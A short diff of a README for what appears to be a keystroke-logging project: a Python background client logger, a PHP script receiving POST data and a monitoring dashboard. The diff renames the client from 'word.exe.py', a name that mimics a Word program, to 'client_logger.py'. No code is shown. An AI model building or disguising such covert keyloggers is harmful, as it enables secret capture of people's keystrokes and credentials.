@@ -17,7 +17,7 @@ A Python-based background keystroke logging application and a PHP dashboard for 
 
 ## Project Structure
 ```text
-word.exe.py    #Python background client logger
+client_logger.py    #Python background client logger
 receive.php    #backend ingestion script for POST data
 view.php       # Monitoring and management dashboard
   
